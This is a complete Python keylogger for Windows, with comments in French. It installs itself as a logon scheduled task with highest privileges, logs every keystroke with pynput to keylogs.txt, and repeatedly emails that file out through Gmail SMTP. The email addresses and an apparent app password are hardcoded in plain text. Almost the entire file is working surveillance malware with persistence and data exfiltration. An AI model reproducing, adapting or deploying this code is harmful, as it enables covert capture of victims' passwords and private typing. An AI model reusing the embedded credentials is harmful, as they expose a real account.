import logging
from threading import Timer
from pynput.keyboard import Key, Listener
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import subprocess
import os


#--------DÉBUT TÂCHES PROGRAMMÉES---------------

# Définir le chemin de l'exécutable
executable_path = os.path.join(os.getcwd(), 'keylogger.exe')

# Définir les paramètres de la tâche planifiée
task_name = "KeyloggerStartupTask"
delay = 30  # Délai en secondes

# Commande pour créer une tâche planifiée qui exécute l'exécutable au démarrage avec temporisation
task_command = (
    f"schtasks /create /tn {task_name} /tr \"cmd /c timeout /t {delay} & {executable_path}\" "
    f"/sc onlogon /rl highest /f"
)

# Vérifier si la tâche existe déjà
check_task = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True, text=True)

# Ajouter la tâche planifiée si elle n'existe pas
if "ERROR" in check_task.stdout:
    result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"L'exécutable a été ajouté au démarrage avec le nom de tâche '{task_name}'.")
    else:
        print("Erreur lors de la création de la tâche :", result.stderr)
else:
    print("L'exécutable est déjà configuré pour démarrer automatiquement.")


#--------FIN TÂCHES PROGRAMMÉES----------------


#--------DÉBUT PARTIE ENVOI MAIL----------------

def sendMail():
    #Configuration pour l'envoi de mail
    port=465
    smtp_server="smtp.gmail.com"
    sender_email="amazonoussama640@gmail.com" #adresse mail bidon d'où le mail va être envoyé
    receiver_email="oussamaau123@gmail.com" #adresse mail sur laquelle on veut recevoir le mail
    password="tdcf hoql nrco flxv"
    objet="Fichier du keylog"
    corps="Envoi du fichier keylog"

    #Création d'un mail multipart
    message=MIMEMultipart()
    message["From"]=sender_email
    message["To"]=receiver_email
    message["Subject"]=objet

    message.attach(MIMEText(corps,"plain"))

    filename="keylogs.txt"

    with open(filename,"rb") as attachment:
        part=MIMEBase("application","octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    message.attach(part)


    context = ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Le mail a été envoyé") # A enlever plus tard


#--------FIN PARTIE ENVOI MAIL------------------

logging.basicConfig(filename=("keylogs.txt"),filemode="w",
                        datefmt='%d/%m/%Y %I:%M:%S %p',format='%(asctime)s:%(message)s',level=logging.DEBUG)


def on_press(key):
    logging.info(str(key))


while True:
    with Listener(on_press=on_press) as listener:
        Timer(10, listener.stop).start()
        listener.join()

    print("Commence à envoyer le mail") # A enlever plus tard
    sendMail()